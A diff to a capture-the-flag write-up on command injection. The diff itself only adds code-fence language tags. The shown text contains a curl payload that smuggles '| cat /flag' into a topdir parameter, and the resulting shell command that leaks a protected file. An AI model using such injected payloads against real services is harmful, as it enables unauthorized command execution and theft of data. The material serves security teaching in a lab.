@@ -8,7 +8,7 @@ The backend constructs and executes a shell command using the user’s `topdir` 
 
 ## server
 
-```
+```python
 #!/usr/bin/exec-suid -- /usr/bin/python3 -I
 
 import subprocess
@@ -64,13 +64,13 @@ By injecting `| cat /flag`, the attacker can trick the shell into executing an a
 
 ### Payload
 
-```
+```SHELL
 curl "http://challenge.localhost:80/quest?topdir=/flag%20|%20cat%20/flag"
 ```
 
 ### Command Executed on Server:
 
-```
+```SHELL
 ls -l /flag | cat /flag
 ```
 
@@ -84,3 +84,4 @@ ls -l /flag | cat /flag
 
 
 This challenge demonstrates Command Injection via pipe (`|`) injection. By injecting `| cat /flag` into the topdir parameter, we successfully executed an unintended command and leaked the contents of the protected flag file.
+
